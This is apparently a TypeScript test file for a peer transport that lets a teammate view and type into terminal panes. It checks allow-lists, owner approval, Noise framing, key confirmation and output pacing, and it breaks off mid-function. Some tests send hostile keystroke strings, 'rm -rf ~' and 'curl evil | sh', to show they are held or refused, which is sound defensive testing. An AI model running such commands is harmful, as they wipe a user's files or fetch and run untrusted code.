// The fourth transport, on its own, with the Noise session real and the relay
// replaced by handing one side's bytes straight to the other.
//
// Two things are being protected here and both are about a caller who is not
// the user. The first is the allow-list: a teammate reaches the catalogue, not
// all of it, and the line between the two is a list rather than a judgement
// made per handler. The second is framing: a Noise transport message is capped
// at 65535 bytes and carries no length, so an application message larger than
// that has to be cut and put back together exactly, or the session ends.

import { describe, expect, it } from 'vitest'
import { z } from 'zod'
import { MAX_REMOTE_WRITE_BYTES, MAX_TERMINAL_ID_CHARS, Params } from '../../shared/methods'
import { createInitiatorSession, createResponderSession, generateStaticKeyPair } from '../../shared/peer'
import type { PeerSession } from '../../shared/peer'
import { ErrorCode } from '../../shared/protocol'
import { createDispatcher } from './dispatcher'
import { MethodRegistry } from './methodRegistry'
import {
  createPeerTransport,
  MAX_PEER_SUBSCRIPTIONS,
  PEER_CALL_TIMEOUT_MS,
  PEER_METHODS,
  STREAM_BUFFER_BYTES,
  STREAM_FLUSH_MS,
  type PeerTransport,
  type RemoteReadVerdict,
  type RemoteWriteDecision,
  type RemoteWriteRequest,
  type RemoteWriteVerdict,
  type TransportFailure,
  type TransportScheduler
} from './peerTransport'
import { createRuntimeContext } from './runtimeContext'
import { SubscriptionHub } from './subscriptionHub'

/** A clock a test moves by hand, so pacing is asserted rather than waited out. */
function manualClock(): TransportScheduler & {
  advance: (ms: number) => void
  /** A suspended machine: the wall clock moves, no timer runs, and then it wakes. */
  sleep: (ms: number) => void
  pending: () => number
} {
  let now = 1_000
  // Kept apart from the wall clock, because everything a deadline concludes
  // depends on the two of them being able to disagree.
  let monotonic = 0
  const timers = new Map<number, { at: number; run: () => void }>()
  let sequence = 0
  const runDue = (target: number): void => {
    for (;;) {
      const due = [...timers.entries()].filter(([, timer]) => timer.at <= target).sort((a, b) => a[1].at - b[1].at)
      const next = due[0]
      if (!next) break
      timers.delete(next[0])
      const step = Math.max(0, next[1].at - monotonic)
      monotonic += step
      now += step
      next[1].run()
    }
  }
  return {
    now: () => now,
    monotonicNow: () => monotonic,
    setTimer: (run, delayMs) => {
      sequence += 1
      const id = sequence
      timers.set(id, { at: monotonic + Math.max(0, delayMs), run })
      return () => {
        timers.delete(id)
      }
    },
    advance: (ms) => {
      const target = monotonic + ms
      const wallTarget = now + ms
      runDue(target)
      monotonic = target
      now = wallTarget
    },
    sleep: (ms) => {
      // macOS's monotonic clock counts time spent suspended, so waking makes
      // every overdue timer fire at once having measured far longer than it
      // was armed for.
      now += ms
      monotonic += ms
      runDue(monotonic)
    },
    pending: () => timers.size
  }
}

/** Two halves of one completed IK handshake, with nothing in between. */
function handshakenPair(): [PeerSession, PeerSession] {
  const initiatorKeys = generateStaticKeyPair()
  const responderKeys = generateStaticKeyPair()
  const initiator = createInitiatorSession({
    staticPrivateKey: initiatorKeys.privateKey,
    remoteStaticPublicKey: responderKeys.publicKey
  })
  const responder = createResponderSession({
    staticPrivateKey: responderKeys.privateKey,
    isAuthorisedPeer: () => true
  })
  responder.readHandshakeMessage(initiator.writeHandshakeMessage())
  initiator.readHandshakeMessage(responder.writeHandshakeMessage())
  return [initiator, responder]
}

type Rig = {
  /** The transport a teammate's runtime would have. */
  caller: PeerTransport
  /** The transport answering on this machine, with the registry behind it. */
  answerer: PeerTransport
  registry: MethodRegistry
  hub: SubscriptionHub
  /** Every stream event the teammate received, in order. */
  received: { stream: string; event: unknown }[]
  /** Every keystroke that reached a pane on the answering side, in order. */
  written: string[]
  /** The panes the answering side believes the teammate has open. */
  watched: () => readonly string[]
  /** Pushes one event into a pane the teammate subscribed to. */
  pane: (terminalId: string) => { emit: (event: unknown) => void; close: () => void } | undefined
  clock: ReturnType<typeof manualClock>
}

type RigOptions = {
  allowedMethods?: readonly Parameters<MethodRegistry['register']>[0][]
  /** The owner's verdict on a keystroke. Left out to prove nothing writes without one. */
  onRemoteWrite?: (write: RemoteWriteRequest) => RemoteWriteVerdict
  /**
   * The owner's verdict on a read. Allowed by default here, because these tests
   * are about pacing, subscriptions and what the owner is told — not about who
   * may look. The refusal a missing judge produces has its own test.
   */
  onRemoteRead?: (terminalId: string) => RemoteReadVerdict
  /** Builds a transport with no read judge at all, to prove reads stop without one. */
  bareRead?: boolean
  /** Run when the answering side first decrypts anything, as key confirmation is. */
  onConfirmed?: (transport: PeerTransport) => void
  /**
   * A clock for the *calling* side, which otherwise runs on the real one.
   *
   * Only a test about what the caller does while it waits needs this; the
   * pacing everything else here asserts happens on the answering side.
   */
  callerScheduler?: TransportScheduler
}

/**
 * Two transports wired mouth to ear.
 *
 * Delivery is synchronous, which is exactly what a WebSocket is not — but the
 * property under test is message boundaries, and a queue between them would
 * only prove the queue kept order.
 */
function rig(allowedMethods?: readonly Parameters<MethodRegistry['register']>[0][], options?: RigOptions): Rig {
  const [callerSession, answererSession] = handshakenPair()
  const hub = new SubscriptionHub()
  const clock = manualClock()
  const received: { stream: string; event: unknown }[] = []
  const written: string[] = []
  const panes = new Map<string, { emit: (event: unknown) => void; close: () => void }>()
  let watched: readonly string[] = []
  const registry = new MethodRegistry(createRuntimeContext({ version: 't', store: {} as never, subscriptions: hub }))

  // Stands in for the terminal service, and only for the part the transport can
  // see: an id, a stream, and a teardown. What is under test here is the wire,
  // not the pty — `relayProcess.test.ts` runs the real one.
  registry.register('terminal.subscribe', Params.terminalSubscribe, (params, call) => ({
    subscription: hub.subscribe(call.connectionId, (channel) => {
      panes.set(params.terminalId, channel)
      return () => panes.delete(params.terminalId)
    })
  }))
  registry.register('terminal.read', Params.terminalRead, () => ({ data: 'scrollback\r\n' }))
  registry.register('unsubscribe', Params.unsubscribe, (params, call) => ({
    unsubscribed: hub.unsubscribe(call.connectionId, params.subscription) as true
  }))

  registry.register('status.get', z.object({}), () => ({
    version: 't',
    endpoint: '',
    pid: 1,
    platform: 'linux' as NodeJS.Platform,
    startedAt: 0
  }))
  registry.register('peer.presence', z.object({}), () => ({ revision: 1, handle: 'them', projects: [] }))
  registry.register('worktree.remove', z.object({ worktreeId: z.string() }), () => ({ removed: true as const }))
  // Everything that actually reached a pane, so "refused" can be asserted as
  // nothing having happened rather than as an error message having come back.
  registry.register('terminal.write', Params.terminalWrite, (params) => {
    written.push(params.data)
    return { written: true as const }
  })

  let answerer: PeerTransport
  const caller = createPeerTransport({
    session: callerSession,
    send: (message) => answerer.receive(message),
    dispatch: createDispatcher(
      new MethodRegistry(
        createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
      )
    ),
    subscriptions: new SubscriptionHub(),
    connectionId: 'peer_caller',
    onStreamEvent: (stream, event) => received.push({ stream, event }),
    ...(options?.callerScheduler ? { scheduler: options.callerScheduler } : {}),
    onFatal: () => {}
  })
  answerer = createPeerTransport({
    session: answererSession,
    send: (message) => caller.receive(message),
    dispatch: createDispatcher(registry),
    subscriptions: hub,
    connectionId: 'peer_answerer',
    scheduler: clock,
    onWatchChange: (terminalIds) => {
      watched = terminalIds
    },
    ...(allowedMethods ? { allowedMethods } : {}),
    ...(options?.onRemoteWrite ? { onRemoteWrite: options.onRemoteWrite } : {}),
    ...(options?.bareRead === true
      ? {}
      : { onRemoteRead: options?.onRemoteRead ?? ((): RemoteReadVerdict => ({ ok: true })) }),
    ...(options?.onConfirmed ? { onConfirmed: () => options.onConfirmed?.(answerer) } : {}),
    onFatal: () => {}
  })

  return {
    caller,
    answerer,
    registry,
    hub,
    received,
    written,
    clock,
    watched: () => watched,
    pane: (terminalId) => panes.get(terminalId)
  }
}

/** Everything one stream carried, concatenated, as the watcher would see it. */
function outputOn(received: readonly { stream: string; event: unknown }[]): string {
  return received
    .filter((frame): frame is { stream: string; event: { type: 'data'; data: string } } => isData(frame.event))
    .map((frame) => frame.event.data)
    .join('')
}

function isData(event: unknown): boolean {
  return typeof event === 'object' && event !== null && (event as { type?: unknown }).type === 'data'
}

describe('what a teammate can reach', () => {
  it('answers a method on the peer allow-list', async () => {
    const { caller } = rig()
    await expect(caller.call('peer.presence', {})).resolves.toMatchObject({ revision: 1 })
  })

  it('refuses a method that is registered but not a teammate’s to call', async () => {
    const { caller } = rig()
    // Registered, reachable over IPC and over the CLI socket, and not this.
    // "Everyone sees everything" is about panes, not about deleting somebody's
    // afternoon from two thousand miles away.
    await expect(caller.call('worktree.remove', { worktreeId: 'wt_1' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })
  })

  it('lets a teammate read a pane and type into one, and reach nothing else', () => {
    // The list is asserted whole, so widening it stays a deliberate edit to one
    // line and never a side effect of registering a handler. C added the two
    // reads a watcher needs; D added `terminal.write` and nothing besides. A
    // teammate's window is not this pane's window and their keyboard is not its
    // power switch, so resize and close stay off it.
    expect(Object.keys(PEER_METHODS).sort()).toEqual([
      'peer.presence',
      'peer.subscribe',
      'terminal.read',
      'terminal.subscribe',
      'terminal.write',
      'unsubscribe'
    ])
    expect(PEER_METHODS).not.toHaveProperty('terminal.resize')
    expect(PEER_METHODS).not.toHaveProperty('terminal.close')
    // A teammate does not get to write a symlink into /usr/local/bin here, and
    // does not get to ask for a password dialog on somebody else's screen.
    expect(PEER_METHODS).not.toHaveProperty('cli.install')
    expect(PEER_METHODS).not.toHaveProperty('cli.status')
    expect(PEER_METHODS).not.toHaveProperty('cli.dismissPrompt')
    // Nor does a teammate get to start a program on somebody else's machine.
    expect(PEER_METHODS).not.toHaveProperty('editor.list')
    expect(PEER_METHODS).not.toHaveProperty('editor.open')
    // Nor does a teammate get to make this machine ask GitHub anything, change
    // a preference on it, or open a page in the browser of whoever is sitting
    // in front of it.
    expect(PEER_METHODS).not.toHaveProperty('update.check')
    expect(PEER_METHODS).not.toHaveProperty('update.download')
    expect(PEER_METHODS).not.toHaveProperty('update.setAutomatic')
    expect(PEER_METHODS).not.toHaveProperty('update.state')
  })

  it('says of every admitted method which project check it goes through', () => {
    // Admission was an allow-list with a safe default; scoping was two `if`s
    // further down the file, matching method names by hand. Nothing joined
    // them, so a method added to the list — `terminal.resize`, a future
    // `terminal.tail` — was admitted and dispatched carrying nothing but the id
    // the remote caller named, with no project check at all and no test failing.
    // That is exactly how `terminal.read` and `terminal.subscribe` shipped
    // unscoped the first time.
    //
    // The list now *is* the table of scopes, so there is no way to add an entry
    // without naming one, and the next omission is a type error rather than a
    // hole. This asserts the assignments themselves: the type stops a method
    // having no scope, and only a test stops it having the wrong one.
    expect(PEER_METHODS).toEqual({
      // Nothing to scope. These are about this link, and answer with what this
      // link is already entitled to.
      'peer.presence': 'link',
      'peer.subscribe': 'link',
      unsubscribe: 'link',
      // Name a pane, and may only have it if the asker shares its project.
      'terminal.read': 'read-pane',
      'terminal.subscribe': 'read-pane',
      // The one that runs code, judged separately from the ones that only look.
      'terminal.write': 'write-pane'
    })
  })

  it('will not let a pane method through without the owner having judged it', async () => {
    // The property the table exists to hold, asserted through the transport
    // rather than over the constant: every method scoped to a pane is refused
    // when there is no judge to scope it with. A new entry that forgot its
    // check would reach the dispatcher here instead.
    for (const [method, scope] of Object.entries(PEER_METHODS)) {
      if (scope === 'link') continue
      const { caller } = rig([method as never], { bareRead: true })
      await expect(caller.call(method as 'terminal.read', { terminalId: 't1' } as never)).rejects.toBeTruthy()
    }
  })

  it('bounds the pane id a read names, not only the one a keystroke names', async () => {
    // The id on a write was capped because it is copied into the owner's log.
    // The id on a read is copied too — into the map that remembers which pane
    // each of this link's subscriptions is streaming, and out of it again to
    // whoever is told who is reading. Bounded in the same place and by the same
    // number, because "which fields a remote caller chooses the size of" is not
    // a question that should have two answers in one file.
    const { caller } = rig()
    await expect(
      caller.call('terminal.read', { terminalId: 'x'.repeat(MAX_TERMINAL_ID_CHARS + 1) })
    ).rejects.toMatchObject({ code: ErrorCode.InvalidParams })
    await expect(
      caller.call('terminal.subscribe', { terminalId: 'x'.repeat(MAX_TERMINAL_ID_CHARS + 1) })
    ).rejects.toMatchObject({ code: ErrorCode.InvalidParams })
  })

  it('refuses a keystroke when nothing is there to attribute it to', async () => {
    // A transport wired without `onRemoteWrite` cannot say whose bytes these
    // are, so it does not carry them. "On the allow-list" and "allowed" are
    // deliberately two different things for the one method that runs code.
    const { caller, written } = rig(['terminal.write'])
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'x' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })
    expect(written).toEqual([])
  })

  it('refuses a read when nothing is there to scope it to', async () => {
    // The same rule as the keystroke above, for the two methods that stream a
    // pane. A transport wired without `onRemoteRead` cannot tell which project
    // this teammate reached it through, and a transport that cannot tell must
    // not guess: the failure would be streaming every pane on the machine to
    // somebody holding one repository's key.
    //
    // `rig` supplies a permissive judge by default, so this one is built
    // without it on purpose.
    const { caller } = rig(['terminal.read', 'terminal.subscribe'], { onRemoteRead: undefined, bareRead: true })
    await expect(caller.call('terminal.read', { terminalId: 't_1' })).rejects.toMatchObject({
      code: ErrorCode.NotFound
    })
    await expect(caller.call('terminal.subscribe', { terminalId: 't_1' })).rejects.toMatchObject({
      code: ErrorCode.NotFound
    })
  })

  it('asks the owner about every read, and streams only the panes they allow', async () => {
    // The hole this closes: reading was on the allow-list and nothing scoped
    // it, so a teammate on one repository's roster could name any pane id on
    // the machine — including a project they hold no key for. Typing has been
    // scoped since it was built; this is reading catching up.
    const asked: string[] = []
    const { caller } = rig(['terminal.read', 'terminal.subscribe'], {
      onRemoteRead: (terminalId) => {
        asked.push(terminalId)
        return terminalId === 't_ours'
          ? { ok: true }
          : { ok: false, code: ErrorCode.NotFound, message: `there is no pane ${terminalId} in this project` }
      }
    })

    await expect(caller.call('terminal.read', { terminalId: 't_ours' })).resolves.toBeDefined()
    await expect(caller.call('terminal.subscribe', { terminalId: 't_theirs' })).rejects.toMatchObject({
      code: ErrorCode.NotFound,
      // Reported exactly as a pane that does not exist. Telling the two apart
      // would answer "is there a pane with this id somewhere on your machine",
      // which is not a question a teammate should be able to ask.
      message: 'there is no pane t_theirs in this project'
    })
    expect(asked).toEqual(['t_ours', 't_theirs'])
  })

  it('asks the owner about every keystroke and writes only what they allow', async () => {
    const asked: string[] = []
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: (write) => {
        asked.push(write.data)
        return write.data === 'no'
          ? { ok: false, code: ErrorCode.Conflict, message: 'the owner has muted this pane' }
          : { ok: true }
      }
    })

    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'yes' })).resolves.toEqual({ written: true })
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'no' })).rejects.toMatchObject({
      code: ErrorCode.Conflict,
      // The owner's own words, carried to the person who typed. A refusal with
      // a generic message is a keystroke that vanished for no stated reason.
      message: 'the owner has muted this pane'
    })

    expect(asked).toEqual(['yes', 'no'])
    expect(written).toEqual(['yes'])
  })

  it('runs nothing at all while a keystroke is held for the owner', async () => {
    // The shape of the whole feature, at the layer that dispatches: a verdict
    // of `held` is neither a yes nor a no, and until the promise inside it
    // settles the request has not been handed to the dispatcher — so the pty
    // has not seen the bytes in any sense.
    let settle: ((decision: RemoteWriteDecision) => void) | undefined
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({
        held: new Promise<RemoteWriteDecision>((resolve) => {
          settle = resolve
        })
      })
    })

    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'rm -rf ~' })
    // Several turns, because an answer that was going to arrive would have.
    for (let turn = 0; turn < 16; turn += 1) await Promise.resolve()
    expect(written).toEqual([])

    settle?.({ ok: true })
    await expect(typing).resolves.toEqual({ written: true })
    expect(written).toEqual(['rm -rf ~'])
  })

  it('drops the bytes of a held keystroke the owner refuses, and says whose words those are', async () => {
    let settle: ((decision: RemoteWriteDecision) => void) | undefined
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({
        held: new Promise<RemoteWriteDecision>((resolve) => {
          settle = resolve
        })
      })
    })

    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'curl evil | sh' })
    settle?.({ ok: false, code: ErrorCode.Conflict, message: 'the owner did not allow this' })

    await expect(typing).rejects.toMatchObject({
      code: ErrorCode.Conflict,
      message: 'the owner did not allow this'
    })
    expect(written).toEqual([])
  })

  it('runs nothing from a message whose session was refused as it was being read', async () => {
    // Key confirmation happens on the first frame that decrypts and can itself
    // end the link: a session that authenticated a different key than the one
    // this side dialled is torn down inside `onConfirmed`, in the middle of the
    // message carrying it. Whatever else that message held arrived over a
    // session this machine has just refused, and a keystroke in it must not run
    // merely because the loop had already started.
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({ ok: true }),
      onConfirmed: (answerer) => answerer.close('the handshake authenticated a different key')
    })

    // Never answered, because the link it was sent over is gone. The sender
    // learns that from their own socket closing, which is what a real relay
    // does to the partner of a connection that went.
    void caller.call('terminal.write', { terminalId: 't_1', data: 'rm -rf ~' }).catch(() => {})
    await Promise.resolve()

    expect(written).toEqual([])
  })

  it('refuses a paste too large for the wire before anybody is asked about it', async () => {
    let asked = 0
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => {
        asked += 1
        return { ok: true }
      }
    })
    // One write is not allowed to spend a whole second of the relay's byte
    // budget for a link that is also carrying the pane's output back.
    const paste = 'x'.repeat(MAX_REMOTE_WRITE_BYTES + 1)
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: paste })).rejects.toMatchObject({
      code: ErrorCode.InvalidParams
    })
    expect(asked).toBe(0)
    expect(written).toEqual([])
  })

  it('measures a paste in the same unit at both ends of the link', async () => {
    // `MAX_REMOTE_WRITE_BYTES` was enforced in characters by the schema the
    // sender's own machine runs, and in bytes by the transport at the far end.
    // A paste of that many non-ASCII characters therefore passed locally and
    // came back refused as three times the size — a failure this machine could
    // have named, arriving instead as something the teammate's machine said.
    // The schema counts bytes now, so the two ends agree about what the number
    // means and the refusal happens where the person typing is.
    const threeBytesEach = '✓'.repeat(MAX_REMOTE_WRITE_BYTES)
    expect(Params.teamworkType.safeParse({ projectId: 'p', paneId: 'x', data: threeBytesEach }).success).toBe(false)
    expect(Params.terminalWrite.safeParse({ terminalId: 't', data: threeBytesEach }).success).toBe(false)
    // And an ordinary paste of the same byte size is still fine.
    const atTheLimit = 'x'.repeat(MAX_REMOTE_WRITE_BYTES)
    expect(Params.teamworkType.safeParse({ projectId: 'p', paneId: 'x', data: atTheLimit }).success).toBe(true)
    expect(Params.terminalWrite.safeParse({ terminalId: 't', data: atTheLimit }).success).toBe(true)
  })

  it('widens by exactly the list it is given, which is how C plugs in', async () => {
    const { caller } = rig(['peer.presence', 'status.get'])
    await expect(caller.call('status.get', {})).resolves.toMatchObject({ version: 't' })
  })
})

describe('framing', () => {
  it('carries a message far larger than one Noise transport message', async () => {
    const { caller, registry } = rig(['peer.presence'])
    // Well past the 65535-byte ceiling, so it has to be cut and reassembled.
    const huge = 'x'.repeat(400_000)
    registry.register('peer.presence', z.object({}), () => ({
      revision: 1,
      handle: huge,
      projects: []
    }))
    const answer = await caller.call('peer.presence', {})
    expect(answer.handle).toHaveLength(400_000)
  })

  it('keeps a multi-byte character whole across a chunk boundary', async () => {
    const { caller, registry } = rig(['peer.presence'])
    // Four-byte characters, in a string long enough that a boundary lands
    // inside one of them — decoded eagerly that becomes U+FFFD and never
    // comes back.
    const emoji = '🛠'.repeat(40_000)
    registry.register('peer.presence', z.object({}), () => ({ revision: 1, handle: emoji, projects: [] }))
    const answer = await caller.call('peer.presence', {})
    expect(answer.handle).toBe(emoji)
  })

  it('ends the link when a message does not authenticate, rather than carrying on', () => {
    const [session] = handshakenPair()
    let fatal: TransportFailure | undefined
    const transport = createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_x',
      onFatal: (failure) => {
        fatal = failure
      }
    })

    // Forged, or reordered, or replayed. Noise transport has no nonce on the
    // wire and no replay window, so all three look the same and all three mean
    // the stream can no longer be trusted or resynchronised.
    transport.receive(new Uint8Array(64))
    expect(fatal).toBeTruthy()
    // And named as what it is, because the caller puts a sentence on a screen
    // and "a frame did not survive the trip" and "this side's own session gave
    // up" are sentences about different machines.
    expect(fatal?.kind).toBe('unauthenticated')
  })
})

describe('key confirmation', () => {
  it('does not fire on a handshake that merely completed', () => {
    // The distinction the whole gate rests on. A responder finishes `IK` having
    // only *written* message 2, so a replayer with a captured message 1 and no
    // private key reaches `established` carrying the real peer's static key.
    const [session] = handshakenPair()
    let confirmed = false
    createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_x',
      onConfirmed: () => {
        confirmed = true
      },
      onFatal: () => {}
    })
    expect(confirmed).toBe(false)
  })

  it('fires on the first transport message that authenticates, and only once', () => {
    const [alice, bob] = handshakenPair()
    let confirmations = 0
    const receiver = createPeerTransport({
      session: bob,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_y',
      onConfirmed: () => {
        confirmations += 1
      },
      onFatal: () => {}
    })

    // An empty keepalive line: nothing to act on, and proof that whoever sent
    // it holds keys a recording cannot supply.
    receiver.receive(alice.encrypt(new TextEncoder().encode('\n')))
    expect(confirmations).toBe(1)
    receiver.receive(alice.encrypt(new TextEncoder().encode('\n')))
    expect(confirmations).toBe(1)
  })

  it('never fires for a sender who cannot produce a valid transport message', () => {
    const [session] = handshakenPair()
    let confirmed = false
    let fatal = false
    const transport = createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_z',
      onConfirmed: () => {
        confirmed = true
      },
      onFatal: () => {
        fatal = true
      }
    })

    // What a replayer has: the ability to open a connection, and nothing to say.
    transport.receive(new Uint8Array(48))
    expect(confirmed).toBe(false)
    expect(fatal).toBe(true)
  })
})

describe('subscriptions a teammate opened', () => {
  it('releases them when the link ends, so nothing outlives the machine that asked', async () => {
    const { caller, answerer, hub, registry } = rig(['peer.subscribe'])
    registry.register('peer.subscribe', z.object({}), (_params, call) => ({
      subscription: hub.subscribe(call.connectionId, () => () => {})
    }))

    await caller.call('peer.subscribe', {})
    expect(hub.countFor('peer_answerer')).toBe(1)

    answerer.close('the teammate went away')
    expect(hub.countFor('peer_answerer')).toBe(0)
  })

  it('refuses a new stream once the teammate holds too many, rather than opening them without limit', async () => {
    const { caller, hub } = rig()

    const held: string[] = []
    for (let pane = 0; pane < MAX_PEER_SUBSCRIPTIONS; pane += 1) {
      held.push((await caller.call('terminal.subscribe', { terminalId: `t${pane}` })).subscription)
    }
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)

    // Refused with a reason a teammate can act on, and refused in the one place
    // that knows the caller is a teammate at all. Nobody reads thirty panes;
    // every record past that is a pacing buffer this machine keeps on somebody
    // else's say-so.
    await expect(caller.call('terminal.subscribe', { terminalId: 'one_too_many' })).rejects.toMatchObject({
      code: ErrorCode.Conflict
    })
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)

    // A ceiling and not a fuse: a teammate who closes a pane may open another.
    await caller.call('unsubscribe', { subscription: held[0]! })
    await expect(caller.call('terminal.subscribe', { terminalId: 'one_more' })).resolves.toMatchObject({
      subscription: expect.any(String) as unknown as string
    })
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)
  })
})

describe('a pane against the relay’s budget', () => {
  it('merges a burst into one frame instead of spending the relay’s frame budget', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    // The first chunk after a pause goes straight out: watching is not
    // uniformly a flush behind for a pane that only speaks occasionally.
    channel?.emit({ type: 'data', data: 'first\r\n' })
    expect(received).toHaveLength(1)

    // The rest of the burst arrives inside one flush window and leaves as one
    // frame, which is lossless: two chunks of a byte stream concatenated are
    // the same byte stream.
    for (let chunk = 0; chunk < 50; chunk += 1) channel?.emit({ type: 'data', data: `line ${chunk}\r\n` })
    expect(received).toHaveLength(1)

    clock.advance(STREAM_FLUSH_MS)
    expect(received).toHaveLength(2)
    expect(outputOn(received)).toContain('line 0\r\nline 1\r\n')
    expect(outputOn(received)).toContain('line 49\r\n')
  })

  it('tells the watcher how much it threw away rather than dropping output silently', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'x' })
    // Far past what may wait for the wire. The tail is what a reader wants, so
    // the head goes — and the count of what went is sent with it.
    const overflow = 'y'.repeat(STREAM_BUFFER_BYTES * 2)
    channel?.emit({ type: 'data', data: overflow })
    clock.advance(STREAM_FLUSH_MS)

    const elided = received.find((frame) => (frame.event as { type?: string }).type === 'elided')?.event as
      | { type: string; bytes: number }
      | undefined
    expect(elided?.type).toBe('elided')
    expect(elided?.bytes ?? 0).toBeGreaterThanOrEqual(STREAM_BUFFER_BYTES)
    // What survived is the end of the burst, not the beginning of it.
    expect(outputOn(received).endsWith('y')).toBe(true)
  })

  it('never throws away an exit, because a pane that finished is a fact and not a volume', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'z'.repeat(STREAM_BUFFER_BYTES * 3) })
    channel?.emit({ type: 'exit', exitCode: 0 })
    // Generous: the byte budget is spent over several flushes, and the point is
    // that the exit is still there at the end of them rather than how fast.
    for (let tick = 0; tick < 200; tick += 1) clock.advance(STREAM_FLUSH_MS)

    expect(received.map((frame) => frame.event)).toContainEqual({ type: 'exit', exitCode: 0 })
  })

  it('keeps an exit behind the output it follows, so a pane never finishes before it speaks', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'a' })
    channel?.emit({ type: 'data', data: 'b' })
    channel?.emit({ type: 'exit', exitCode: 0 })
    clock.advance(STREAM_FLUSH_MS)

    const types = received.map((frame) => (frame.event as { type: string }).type)
    expect(types.indexOf('exit')).toBeGreaterThan(types.lastIndexOf('data'))
  })
})

describe('what the owner is told about who is reading', () => {
  it('names the pane a teammate opened, and forgets it when they close it', async () => {
    const { caller, watched } = rig()
    const { subscription } = await caller.call('terminal.subscribe', { terminalId: 't1' })
    expect(watched()).toEqual(['t1'])

    await caller.call('unsubscribe', { subscription })
    expect(watched()).toEqual([])
  })

  it('sends what the pane had already printed before saying the owner closed it', async () => {
    // `session-manager.ts` calls `endStreamsFor(terminalId)` *before*
    // `session.close()`, so the producer ends the channel while the pacer is
    // still holding up to a flush interval of that pane's output — and, behind
    // it, whatever exit or title was queued. All of it used to be deleted with
    // the stream, and the watcher was handed `lost` and nothing else: the last
    // thing the pane printed, and the code it exited with, gone with no
    // `elided` to mark that anything had been.
    //
    // This file's own `evict` refuses to drop an exit or a title "because a
    // watcher that lost one would be told the pane is still running when it is
    // not", and its header says dropping output silently would make the whole
    // feature a lie. This is that, on the one path where the stream ends.
    const { caller, received, pane } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })

    // Out at once: the leading edge sends a pane that has been quiet.
    pane('t1')?.emit({ type: 'data', data: 'FIRST' })
    // Held: inside the flush interval, so this is armed rather than written.
    pane('t1')?.emit({ type: 'data', data: 'HELD-BY-PACER' })
    pane('t1')?.emit({ type: 'exit', exitCode: 3 })
    pane('t1')?.close()

    const events = received.map((frame) => frame.event)
    expect(events).toContainEqual({ type: 'data', data: 'HELD-BY-PACER' })
    expect(events).toContainEqual({ type: 'exit', exitCode: 3 })
    // And in that order: the pane's last output, then the code it exited with,
    // then the news that it is gone.
    const types = events.map((event) => (event as { type: string }).type)
    expect(types.indexOf('exit')).toBeGreaterThan(types.lastIndexOf('data'))
    expect(types.lastIndexOf('lost')).toBeGreaterThan(types.indexOf('exit'))
  })

  it('forgets a pane whose stream the owner ended, and says so rather than going quiet', async () => {
    const { caller, received, pane, watched } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    expect(watched()).toEqual(['t1'])

    // What the owner closing their own pane looks like from here: the producer
    // ends the stream, and nothing else would ever tell the reader.
    pane('t1')?.close()

    expect(watched()).toEqual([])
    expect(received.map((frame) => frame.event)).toContainEqual({
      type: 'lost',
      reason: 'the owner closed this pane'
    })
  })

  it('reports one pane per teammate however many streams they hold on it', async () => {
    const { caller, watched } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    await caller.call('terminal.subscribe', { terminalId: 't1' })

    expect(watched()).toEqual(['t1'])
  })

  it('says nobody is reading a pane a teammate asked for and was refused', async () => {
    const { caller, watched } = rig(['peer.presence', 'unsubscribe'])
    await expect(caller.call('terminal.subscribe', { terminalId: 't1' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })

    expect(watched()).toEqual([])
  })
})

describe('a call the teammate never answers', () => {
  /**
   * One transport shouting into a socket nobody is reading.
   *
   * Exactly the shape a shut laptop leaves: the session is fine, the frames go
   * out, and no answer will ever come back. Nothing is delivered to it, so
   * there is no second transport here at all.
   */
  function intoTheVoid(): { transport: PeerTransport; clock: ReturnType<typeof manualClock>; sent: number } {
    const [session] = handshakenPair()
    const clock = manualClock()
    const state = { sent: 0 }
    const transport = createPeerTransport({
      session,
      send: () => {
